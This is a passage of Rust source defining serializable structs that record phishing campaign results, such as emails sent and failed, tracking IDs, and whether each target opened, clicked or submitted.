    pub emails_sent: usize,
    pub emails_failed: usize,
    pub template_used: String,
    pub tracking_id: String,
    pub results: Vec<PhishingTargetResult>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PhishingTargetResult {
    pub target_email: String,
    pub status: String,
    pub tracking_id: String,
    pub opened: bool,
    pub clicked: bool,
    pub submitted: bool,
    pub timestamp: Option<String>,
}
